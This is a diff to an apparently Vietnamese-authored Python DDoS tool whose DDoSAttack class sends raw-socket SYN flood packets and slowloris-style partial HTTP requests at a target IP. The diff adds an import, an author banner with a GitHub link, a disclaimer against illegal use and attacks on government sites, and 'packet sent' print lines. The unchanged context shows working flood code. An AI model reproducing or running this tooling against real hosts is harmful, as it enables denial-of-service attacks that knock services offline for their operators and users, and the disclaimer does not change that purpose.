@@ -6,6 +6,7 @@ from urllib.parse import urlparse
 from colorama import Fore, Style, init
 from socket import *
 from random import randrange, choice
+from struct import pack, htons
 import re
 
 # Initialize colorama
@@ -16,6 +17,9 @@ print(Fore.MAGENTA + """
  \ \_/ / { || {_} }/ {-. \{ {__-`{ {__-`    { {__-``-' '-'| } { |} {-. \{ |/ {-. \ 
   \   /  | }| {_} }\ '-} /.-._} }.-._} }    .-._} }  } {  \ `-' /} '-} /| }\ '-} / 
    `-'   `-'`----'  `---' `----' `----'     `----'   `-'   `---' `----' `-' `---'  
+  AuThor: __VIBOSS__
+  Github: https://github.com/dhungx/ddos
+  ĐỪNG DÙNG MÃ NÀY GÂY PHẠM PHÁP VÀ QUAN TRỌNG HƠN LÀ ĐỪNG TẤN CÔNG WEB CHÍNH PHỦ
 """)
 
 class DDoSAttack:
@@ -71,6 +75,7 @@ class DDoSAttack:
             sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
             sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
             sock.sendto(packet, (self.target_ip, 0))
+            print(Fore.GREEN + "SYN Flood packet sent!")
         except KeyboardInterrupt:
             print(Fore.YELLOW + "SYN Flood stopped.")
         except Exception as e:
@@ -82,6 +87,7 @@ class DDoSAttack:
             sock.connect((self.target_ip, 80))
             sock.send(b'GET / HTTP/1.1\r\n')
             time.sleep(5)
+            print(Fore.GREEN + "Pyslow packet sent!")
         except KeyboardInterrupt:
             print(Fore.YELLOW + "Pyslow stopped.")
         except Exception as e:
